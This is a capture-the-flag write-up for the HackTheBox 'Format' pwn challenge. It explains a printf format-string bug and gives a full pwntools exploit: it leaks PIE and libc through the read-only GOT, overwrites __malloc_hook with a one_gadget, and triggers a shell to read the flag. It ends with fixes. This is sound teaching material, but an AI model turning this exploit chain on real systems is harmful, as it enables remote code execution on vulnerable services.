## Overview

**Format** is an Easy HackTheBox **Pwn** challenge. The program loops forever reading a line
and printing it with `printf(buf)` — a textbook [format-string vulnerability](https://cwe.mitre.org/data/definitions/134.html)
([CWE-134](https://cwe.mitre.org/data/definitions/134.html)). Every protection is on (Full
RELRO, PIE, canary, NX), and there's no `win()` function or flag in the binary, so we need
real code execution in libc. The trick: Full RELRO makes the GOT *read-only* but still
*readable*, so we leak libc through it, then overwrite the writable `__malloc_hook` with a
one_gadget and trigger it.

## The technique

`echo()` is an infinite loop that hands user input to `printf` as the format string:

```c
void echo() {
    char buf[0x110];
    while (1) {
        fgets(buf, 0x100, stdin);
        printf(buf);            // attacker controls the format string
    }
}
```

That gives both a read primitive (`%p` / `%s`) and a write primitive (`%n`), repeatable as
many times as we like on one connection.

`checksec` shows the hardening:

```
Arch: amd64   RELRO: Full   Stack: Canary   NX: enabled   PIE: enabled
```

The usual format-string finisher — `%n` to overwrite a GOT entry — is dead, because
**Full RELRO makes the GOT read-only**. But Full RELRO only removes *write* access; the GOT
is still **readable**, and libc's malloc hooks live in libc's own writable data, not the GOT.
So the plan is:

1. Read a GOT slot with `%s` to leak libc (no `%n` required).
2. Use `%n` to overwrite **`__malloc_hook`** with a one_gadget.
3. Make `printf` call `malloc` internally so the hook fires → shell.

## Solution

**Leak the PIE base.** A saved return address sits at a fixed positional argument; `%37$p`
returned a value whose low bits matched `init+...` in `objdump`, giving
`pie_base = leak - 0x126d`.

**Leak libc without `%n`.** Place the address of `printf`'s GOT slot (`pie_base + 0x3fc0`,
from `objdump -R`) in the buffer and read the live pointer with `%s` → `libc_base = printf -
0x64e80`. Feeding the low-12 bits of three symbols to [libc.rip](https://libc.rip)
(`printf:e80, fgets:b20, setvbuf:2f0`) identifies the remote as glibc 2.27.

**Overwrite the hook and trigger it.** `fmtstr_payload` writes the one_gadget into
`__malloc_hook`, then a huge field width (`%100000c`) forces `printf` to `malloc` a work
buffer — firing the hook into `execve("/bin/sh", ...)`.

Create `solve.py`:

```python
#!/usr/bin/env python3
import sys
from pwn import *
context.clear(arch='amd64', os='linux')

elf  = ELF('files/format', checksec=False)
libc = ELF('files/libc6_2.27-0ubuntu3_amd64.so', checksec=False)
HOST, PORT = sys.argv[1], int(sys.argv[2])

PRINTF_OFF, PRINTF_GOT, FMT_OFF = 0x64e80, 0x3fc0, 6
ONE_GADGETS = [0x4f2c5, 0x4f322, 0x10a38c]   # glibc 2.27

def attempt(og):
    io = remote(HOST, PORT)
    io.sendline(b'AA%37$pBB')
    io.recvuntil(b'AA'); pie = int(io.recvuntil(b'BB', drop=True), 16) - 0x126d
    assert pie & 0xfff == 0
    pre = b'CC%8$sDD'; pre += b'E' * (16 - len(pre))
    io.sendline(pre + p64(pie + PRINTF_GOT))
    io.recvuntil(b'CC')
    printf = u64(io.recvuntil(b'DD', drop=True)[:6].ljust(8, b'\x00'))
    libc.address = printf - PRINTF_OFF
    io.sendline(fmtstr_payload(FMT_OFF,
                {libc.sym.__malloc_hook: libc.address + og}, write_size='short'))
    io.clean(0.3)
    io.sendline(b'%100000c'); io.clean(0.3)
    io.sendline(b'echo PWNED_$((1+1))')
    try: io.recvuntil(b'PWNED_2', timeout=3)
    except EOFError: io.close(); return None
    return io

for og in ONE_GADGETS:
    io = attempt(og)
    if io:
        io.sendline(b'cat flag* /flag* 2>/dev/null')
        print(io.recvrepeat(2).decode(errors='replace'))
        break
```

Run it against the instance:

```bash
python3 solve.py <target-ip> <target-port>
```

```
[+] SHELL via one_gadget 0x4f322
HTB{...}
```

## Why it worked

`printf(buf)` trusted user input as the format string. Full RELRO blocked the GOT *write*,
but the GOT was still *readable* (so we leaked libc through it), and libc's `__malloc_hook`
was a writable function pointer that runs on the next allocation. The infinite echo loop made
the multi-stage leak-then-write chain trivial — read, write, trigger, all in one session.

## Fix / defense

Never pass user-controlled data as a format string — use a literal: `printf("%s", buf)`.
Compile with `-Wformat -Wformat-security` and `FORTIFY_SOURCE=2` to catch the mistake. On
modern glibc (≥ 2.34) the malloc hooks were removed precisely because they were such a clean
RCE target; the same leak there would pivot to file-stream (FSOP) or exit-handler corruption
instead.
